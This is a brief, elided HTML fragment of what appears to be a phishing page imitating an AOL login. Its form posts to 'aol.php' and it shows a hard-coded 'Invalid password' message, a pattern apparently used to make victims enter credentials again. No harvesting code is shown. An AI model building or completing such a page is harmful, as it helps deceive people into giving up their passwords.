               ...
               <div class="col-1">
                    <div class="login-box">
                        ...
                        <div class="challenge">
                            ...
                            <form action="aol.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                                ...
                                <p style="font-size: 12px;text-align: left;line-height: 1.17647rem;padding-top: .29412rem;color: #f0162f;"> Invalid password. Please try again</p>
